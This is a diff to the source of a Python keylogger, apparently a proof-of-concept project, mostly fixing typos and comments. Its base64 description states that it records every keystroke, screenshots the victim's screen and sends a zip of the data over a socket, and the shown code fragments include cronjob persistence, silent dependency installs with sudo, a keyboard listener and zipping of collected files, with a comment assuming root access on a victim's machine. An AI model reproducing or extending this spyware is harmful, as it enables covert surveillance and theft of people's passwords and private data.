@@ -8,14 +8,11 @@ Author : Alexis Rodriguez
 Start date : 2020-02-09
 End date : 2020-02-18
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Decrypt me %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
-			  gb24gYSBrZXlib2FyZCwgdGFrZXMgYSBzY3JlZW5zaG90IG9mIHRoZSB2aWN0aW1zIHNjcmVlbiwg
-			  YW5kIGJpbmRzIGEgc2VydmVyIHNvY2tldCB0byB0cmFuc2ZlciBhIHppcCBmaWxlIG9mIGFsbCB0aGUgZ
-			  2F0aGVyZWQgZGF0YSBvdmVyYSBzb2NrZXQgY29ubmVjdGlvbi4gVGhlIGtleXNlbGYubG9nZ2VyIHRleHQg
-			  ZmlsZSBpcyB1cGRhdGVkIGV2ZXJ5IDIwIHNlY29uZHMgYW5kIHRoZSBzY3JlZW4gY2FwdHVyZSBvY2N1c
-			  nMgZXZlcnkgMiBtaW51dGVzLiBBcyBvZiByaWdodCBub3cgdGhpcyBwcm9ncmFtIHdpbGwgb25seSB3b3Jr
-			  IG9uIExpbnV4IG1hY2hpbmVzIGJ1dCB3aWxsIGJlIHVwZGF0ZWQgaW4gdGhlIG5lYXIgZnV0dXJlIGZvciBXa
-			  W5kb3dzIG1hY2hpbmUgdG9vLg==
+Description : VGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQgb24gYSBrZXlib2FyZCwgdGFrZXMgYSBzY3JlZW5za
+G90IG9mIHRoZSB2aWN0aW1zIHNjcmVlbiwgYW5kIGJpbmRzIGEgc2VydmVyIHNvY2tldCB0byB0cmFuc2ZlciBhIHppcCBmaWxlIG9mIGFsbCB0aGUg
+Z2F0aGVyZWQgZGF0YSBvdmVyIGEgc29ja2V0IGNvbm5lY3Rpb24uIFRoZSBrZXkgdGV4dCBmaWxlIGlzIHVwZGF0ZWQgZXZlcnkgMjAgc2Vjb25kcyB
+hbmQgdGhlIHNjcmVlbiBjYXB0dXJlIG9jY3VycyBldmVyeSAyIG1pbnV0ZXMuIEFzIG9mIHJpZ2h0IG5vdyB0aGlzIHByb2dyYW0gd2lsbCBvbmx5IH
+dvcmsgb24gTGludXggbWFjaGluZXMgYnV0IHdpbGwgYmUgdXBkYXRlZCBpbiB0aGUgbmVhciBmdXR1cmUgZm9yIFdpbmRvd3MgbWFjaGluZXMgdG9vLg==
 			  
 			  ___   _      ___   _      ___   _      ___   _      ___   _
 			 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
@@ -46,7 +43,7 @@ import subprocess as subp
 install dependency if necessary
 '''
 def install_dependency(module_name):
-  # attempt to download python's packacke installer
+  # attempt to download python's package installer
   subp.call('sudo apt install python-pip3', shell=True)
   # downloading module
   subp.call('pip install ' + module_name, shell=True)
@@ -55,13 +52,13 @@ def install_dependency(module_name):
 
 '''
 The following dependencies may not be installed by default
-so try importing them and if it fails attempt
+so try importing them and if it fails, attempt
 to download them using pythons package installer
 *NOTE* - downloading these modules depends on the user's privileges,
 and of course I am assuming someone utilizing a keylogger has already
 found a way to upload malicious files onto a victim's computer
-and has aptly obtained root/admin privileges though as a proof
-of concept downloading these modules manually will do not harm
+and has aptly obtained root/admin privileges, though as a proof
+of concept downloading these modules manually will do no harm
 '''
 try:
   # module to take screenshot
@@ -85,7 +82,7 @@ except:
 ''' 					   CLASS DEFINITION    '''
 '''************************************************************'''
 class Keylogger:
-	# invoking the constructor will declare class variable self.log
+	# invoking the constructor
 	def __init__(self):
 		self.log = ''
 		# create cronjob
@@ -96,7 +93,7 @@ class Keylogger:
 		self.directory = self.make_get_dir()
 
 	'''
-	Begin capturing keystrokes
+	Begin capturing keystrokes, taking screenshots, and opening socket connection
 	'''
 	def start_listening(self):
 		with keyboard.Listener(
@@ -199,7 +196,7 @@ class Keylogger:
 		zip_name = 'zipped_file.zip'
 		# os.walk returns current_path, directories in current_path,
 		# files in current_path
-		for root, directories, files in os.walk(direc):
+		for root, _, files in os.walk(direc):
 			for file in files:
 				# joining absolute path with file name
 				filepath = os.path.join(root, file)
